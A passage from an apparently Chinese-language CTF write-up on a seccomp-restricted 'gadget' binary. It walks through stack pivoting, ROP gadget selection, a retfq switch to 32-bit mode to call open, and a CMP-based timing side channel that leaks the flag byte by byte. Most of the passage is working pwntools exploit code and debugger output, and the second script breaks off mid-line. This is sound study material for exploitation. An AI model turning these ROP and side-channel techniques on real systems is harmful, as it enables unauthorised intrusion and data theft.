<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 64位 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fstat 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="comment">/* 32位 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_open 5</span></span><br></pre></td></tr></table></figure>
<p>可以使用 32 位的 open 打开文件，然后回到 64 位把 flag 读出来</p>
<ul>
<li>修改程序运行模式需要用到 retfq/retf 这个指令</li>
<li>这个指令有两步操作：pop ip；pop cs（retf 是32位的 pop，retfq 是64位的 pop）<ul>
<li>cs=0x23 程序以32位模式运行</li>
<li>cs=0x33 程序以64位模式运行 </li>
</ul>
</li>
</ul>
<p>现代的 CS 寄存器中用于存放数据段选择子(Code-Segment Descriptors)，如下为其格式： </p>
<p><img src="/2022/06/02/gadget+ORA+CMP%20trick/1653983725684.png" alt="1653983725684"> </p>
<ul>
<li>选择子的 D 标志位，它用以区分程序应该运行在32位还是64位架构上</li>
</ul>
<p>使用 ropper 把 gadget 提取出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Gadget time ropper --file ./gadget --nocolor &gt; g1 </span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line">ropper --file ./gadget --nocolor &gt; g1  <span class="number">0.30</span>s user <span class="number">0.34</span>s system <span class="number">103</span>% cpu <span class="number">0.620</span> total</span><br></pre></td></tr></table></figure>
<p><strong>思路1：控制 read 输入任意大小的字节，利用汇编代码CMP单字节爆破 flag（非预期）</strong></p>
<p>因为程序自带的 read 只能输入“0xC0”字节，可能写不完 ROP 链，所以我们的第一个目标就是构造一个 read，向一片固定区域写入 ROP 链</p>
<p>程序开了 ASLR，没有开 PIE，最好在 bss 段上进行 ROP，所以要进行栈迁移，接下来就是寻找合适的 gadget 了，接下来谈一谈我找寻 gadget 的思路：</p>
<ul>
<li>执行 read 系统调用，需要控制 rax，rdi，rsi，rdx，所以我们先找一找直接 pop 这些寄存器代码（必须要带有 ret）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401001</span>: pop rax; ret; </span><br><span class="line"><span class="number">0x0000000000401734</span>: pop rdi; pop rbp; ret; </span><br><span class="line"><span class="number">0x0000000000401732</span>: pop rsi; pop r15; pop rbp; ret; </span><br><span class="line"><span class="number">0x00000000004079db</span>: pop rdx; add byte ptr [rax], al; <span class="keyword">or</span> cl, byte ptr [rdi]; pushfq; ret <span class="number">0xfdbf</span>; </span><br><span class="line"><span class="number">0x0000000000408865</span>: syscall; ret; </span><br></pre></td></tr></table></figure>
<ul>
<li>程序往往不会直接提供它们的 pop（尤其是 rdx），在控制这些寄存器的同时，往往会改变一下其他的数据，产生“代价”（副作用）</li>
<li>比如：pop rdx 产生的“代价”为“ret 0xfdbf”，中断了我们的 ROP 链，接下来就要考虑通过 mov 来间接获取 rdx（必须有 ret，尽量不改变 rax,rdi,rsi，没有 syscall，有 call 可以酌情考虑）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000402c05</span>: mov esi, edi; mov rdx, r12; call r14; mov edi, eax; call <span class="number">0x1010</span>; ret; </span><br></pre></td></tr></table></figure>
<ul>
<li>这条指令虽然有 call r14，但是 r14 是可以控制的，可以将其修改为 syscall 完成最后的收尾，很容易就可以找到控制 r14 的指令，随便找到控制 r12 的指令（间接控制 rdx）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401731</span>: pop r14; pop r15; pop rbp; ret; </span><br><span class="line"><span class="number">0x000000000040172f</span>: pop r12; pop r14; pop r15; pop rbp; ret; </span><br></pre></td></tr></table></figure>
<ul>
<li>接下来用同样的方式控制 rsp</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000409d1c</span>: pop rsp; mov edi, <span class="number">0x88bf2838</span>; ret; </span><br></pre></td></tr></table></figure>
<p>最后进行组合：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = elf.bss()+<span class="number">0x400</span></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000401001</span></span><br><span class="line">pop_rdi_pop_rbp_ret = <span class="number">0x0000000000401734</span></span><br><span class="line">pop_rsi_pop_r15_pop_rbp_ret = <span class="number">0x0000000000401732</span></span><br><span class="line">syscall_ret = <span class="number">0x0000000000408865</span></span><br><span class="line">mov_rdx_r12_call_r14 = <span class="number">0x0000000000402c05</span>+<span class="number">2</span></span><br><span class="line">pop_r14_pop_r15_pop_rbp_ret = <span class="number">0x0000000000401731</span></span><br><span class="line">pop_r12_pop_r14_pop_r15_pop_rbp_ret=<span class="number">0x000000000040172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x0000000000409d1c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_pop_rbp_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">payload += p64(pop_rsi_pop_r15_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_r14_pop_r15_pop_rbp_ret) + p64(syscall_ret) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_r12_pop_r14_pop_r15_pop_rbp_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br></pre></td></tr></table></figure>
<p>很可惜超过“0xC0”的范围了，最终我采用了别人组好的 ROP 链：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bss_addr = elf.bss()+<span class="number">0x400</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>大佬使用了一个巧妙的指令拆分：把 “mov esi, edi” 变为 “mov rsi, r15”</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x402c05</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x402c05</span> (libc_start_main_stage2+<span class="number">30</span>) ◂— mov    esi, edi</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x402c04</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x402c04</span> (libc_start_main_stage2+<span class="number">29</span>) ◂— mov    rsi, r15</span><br></pre></td></tr></table></figure>
<p>现在简述一下方案的可行性：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>CMP结果</th>
<th>ZF</th>
<th>CF</th>
</tr>
</thead>
<tbody>
<tr>
<td>目的操作数 &lt; 源操作数</td>
<td>0</td>
<td>1</td>
</tr>
<tr>
<td>目的操作数 &gt; 源操作数</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>目的操作数 = 源操作数</td>
<td>1</td>
<td>0</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>如果“目的操作数”从 ASCII 的最小值开始增加，其实就只有两种情况：<ul>
<li>目的操作数 &lt; 源操作数，ZF=0</li>
<li>目的操作数 = 源操作数，ZF=1</li>
</ul>
</li>
</ul>
<p>大佬选择的 gadget 为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000408266</span>: cmp byte ptr [rax - <span class="number">0x46</span>], cl; push rbp; ret <span class="number">0x5069</span>; </span><br></pre></td></tr></table></figure>
<ul>
<li>一般出现 ret 0x5069 都是因为 ropper 识别出错（就可以把它认为是一个 ret）</li>
<li>push 后直接 ret，控制了 rbp 就等同于控制了 rip</li>
</ul>
<p>为了区分 “ZF=0” 和 “ZF=1”，我们需要汇编指令：je / jne</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>助记符</th>
<th>说明</th>
<th>标志位/寄存器</th>
</tr>
</thead>
<tbody>
<tr>
<td>je</td>
<td>相等时跳转</td>
<td>ZF=1</td>
</tr>
<tr>
<td>jne</td>
<td>不相等时跳转</td>
<td>ZF=0</td>
</tr>
</tbody>
</table>
</div>
<p>为了把这种微小的差别映射到用户端，需要一些特殊的措施</p>
<p>先看看下面这一组很有意思的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbp <span class="number">0x405831</span> (__lctrans_impl+<span class="number">173</span>) ◂— jne    <span class="number">0x405837</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x405837</span> (__lctrans_impl+<span class="number">179</span>) ◂— jmp    <span class="number">0x405837</span></span><br></pre></td></tr></table></figure>
<ul>
<li>jne 跳转到 0x405837，然后 jmp 跳转它自己，造成循环</li>
<li>反应到用户端中，就是程序卡顿</li>
</ul>
<p>我们可以利用这个性质，用 “recv(timeout = 1)” 接收报错信息，如果在1秒钟内没有接受到，就证明了程序陷入了循环，从而证明了 “ZF=0”，最终证明了 “目的操作数 &lt; 源操作数”</p>
<ul>
<li>如果：目的操作数 = 源操作数（ZF=1），程序会报错</li>
<li>如果：目的操作数 &lt; 源操作数（ZF=0），程序会陷入循环</li>
</ul>
<p>完整exp为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_ret = <span class="number">0x4011ed</span></span><br><span class="line">cmp_push_rbp_ret = <span class="number">0x408266</span> </span><br><span class="line">jnz_loop = <span class="number">0x405831</span> </span><br><span class="line">loop = <span class="number">0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">index, char</span>):</span></span><br><span class="line">	payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">	payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">	payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">	io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	sleep(<span class="number">0.1</span>)</span><br><span class="line">	payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">	payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">	payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(retf_ret) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">	payload += p32(retf_ret) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">	payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">	payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">	payload += p64(pop_rbp_ret) + p64(jnz_loop)</span><br><span class="line">	payload += p64(cmp_push_rbp_ret)</span><br><span class="line">	io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pos = <span class="number">0</span></span><br><span class="line">	flag = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">			io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">			pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				io.recv(timeout = <span class="number">0.5</span>)</span><br><span class="line">				io.close()</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				flag += i</span><br><span class="line">				<span class="built_in">print</span>(flag)</span><br><span class="line">				io.close()</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		pos = pos + <span class="number">1</span></span><br><span class="line">	success(flag)</span><br></pre></td></tr></table></figure>
<p><img src="/2022/06/02/gadget+ORA+CMP%20trick/1654089820944.png" alt="1654089820944"> </p>
<p><strong>思路2：分多段控制 sys_read，利用汇编代码CMP单字节爆破 flag（非预期）</strong></p>
<p>首先还是要进行栈迁移，但这次不采用 syscall，而是直接使用程序中已有的 void read_sys(char <em>a1)：（只需要改变 </em>a1 就可以了）</p>
<ul>
<li>这样操作的话就不需要 pop rdx 了</li>
<li>但是必须分多次执行 read_sys（弥补长度不够的限制）</li>
</ul>
<p>首先还是进行栈迁移，但这次我们采用 setcontext 中的万能模板（堆上ORW也会用到）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40172a</span> &lt;install_seccomp+<span class="number">1274</span>&gt;        lea    rsp, [rbp - <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x40172e</span> &lt;install_seccomp+<span class="number">1278</span>&gt;        pop    rbx</span><br><span class="line">  <span class="number">0x40172f</span> &lt;install_seccomp+<span class="number">1279</span>&gt;        pop    r12</span><br><span class="line">  <span class="number">0x401731</span> &lt;install_seccomp+<span class="number">1281</span>&gt;        pop    r14</span><br><span class="line">  <span class="number">0x401733</span> &lt;install_seccomp+<span class="number">1283</span>&gt;        pop    r15</span><br><span class="line">  <span class="number">0x401735</span> &lt;install_seccomp+<span class="number">1285</span>&gt;        pop    rbp</span><br><span class="line">  <span class="number">0x401736</span> &lt;install_seccomp+<span class="number">1286</span>&gt;        ret  </span><br></pre></td></tr></table></figure>
<p>第一段 ROP 链为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag_addr=elf.bss()+<span class="number">0x200</span></span><br><span class="line">ROP_addr=elf.bss()+<span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x38</span>+p64(pop_rdi_pop_rbp_ret)+p64(ROP_addr)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(ROP_addr+<span class="number">0x20</span>-<span class="number">0x28</span>+<span class="number">0x8</span>)+p64(lea_rsp_pop_0x28)</span><br><span class="line"></span><br><span class="line">p.send(payload.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>flag_addr+0x20：为了规避 [rbp - 0x20] 的影响</li>
<li>flag_addr-0x28：避免 pop 0x28 的影响</li>
<li>flag_addr+0x8：跳过下面的的 “flag”.ljust(8,”\x00”)</li>
</ul>
<p>接下来我们就要切换“32”位执行 open，然后换回“64”位继续调用 sys_read</p>
<p>第二段 ROP 链为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload2=<span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload2+=p64(retfq)+p64(pop_rbx_pop_r14_pop_r15_pop_rbp_ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">payload2+=p32(ROP_addr)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(pop_rcx_ret)+p32(<span class="number">0</span>)</span><br><span class="line">payload2+=p32(pop_rax_ret)+p32(<span class="number">5</span>)+p32(int_0x80_ret)</span><br><span class="line">payload2+=p32(retfq)+p32(pop_rdi_pop_rbp_ret)+p32(<span class="number">0x33</span>)</span><br><span class="line">payload2+=p64(ROP_addr+<span class="built_in">len</span>(payload2)+<span class="number">24</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload2.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：调用 sys_read 对其参数进行了调整</li>
</ul>
<p>接着就是执行 read，然后使用如下一段 gadget 来进行“对比”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x408f72</span> (close_file+<span class="number">117</span>) ◂— cmp    rax, qword ptr [r15 + <span class="number">0x38</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x408f7a</span> (close_file+<span class="number">125</span>) ◂— <span class="keyword">int</span>    <span class="number">0xb9</span></span><br></pre></td></tr></table></figure>
<p>第三段 ROP 链为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">c=<span class="built_in">len</span>(f)</span><br><span class="line">caddr=flag_addr+c</span><br><span class="line"></span><br><span class="line">payload3=p64(pop_rdi_pop_rbp_ret)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload3+=p64(pop_rsi_pop_r15_pop_rbp_ret)+p64(flag_addr)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload3+=p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload3+=p64(pop_rdi_pop_rbp_ret)+p64(caddr+<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">payload3+=p64(pop_rsi_pop_r15_pop_rbp_ret)+p64(<span class="number">0</span>)+p64(caddr-<span class="number">0x38</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload3+=p64(pop_rax_ret)+p64(guess)+p64(cmpa)</span><br><span class="line"></span><br><span class="line">p.send(payload3.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>guess：猜测的字符</li>
</ul>
<p>总体的逻辑和“思路1”类似，只是栈迁移和最后的 cmp gadget 使用的不一样，实际上 GDB 跟进时是这样的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x408f72</span> &lt;close_file+<span class="number">117</span>&gt;    cmp    rax, qword ptr [r15 + <span class="number">0x38</span>]</span><br><span class="line">  <span class="number">0x408f76</span> &lt;close_file+<span class="number">121</span>&gt;    mov    eax, <span class="number">0xcd2cfca4</span></span><br><span class="line">  <span class="number">0x408f7b</span> &lt;close_file+<span class="number">126</span>&gt;    mov    ecx, <span class="number">0xdf6f8009</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果：目的操作数 &lt; 源操作数（ZF=0），程序会报错</li>
<li>如果：目的操作数 = 源操作数（ZF=1），程序会陷入循环</li>
</ul>
<p>最后还有一个值得注意的地方：</p>
<ul>
<li>cmp  rax, qword ptr [r15 + 0x38] 的对比的大小为 qword，而我们希望一次性只对比单个字节，</li>
<li>所以需要再调用一次 sys_read 把除了“第一字节”以外的其他字节置空</li>
</ul>
<p>第四段 ROP 链为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload4=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.send(payload4)</span><br></pre></td></tr></table></figure>
<p>完整exp为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_addr=<span class="number">0x401170</span></span><br><span class="line">retfq=<span class="number">0x4011EC</span></span><br><span class="line">int_0x80_ret=<span class="number">0x4011F3</span></span><br><span class="line">syscall_ret=<span class="number">0x408865</span></span><br><span class="line">pop_rax_ret=<span class="number">0x401001</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x401102</span></span><br><span class="line">pop_rbx_pop_r14_pop_r15_pop_rbp_ret=<span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret=<span class="number">0x40117b</span></span><br><span class="line">pop_rdi_pop_rbp_ret=<span class="number">0x401734</span></span><br><span 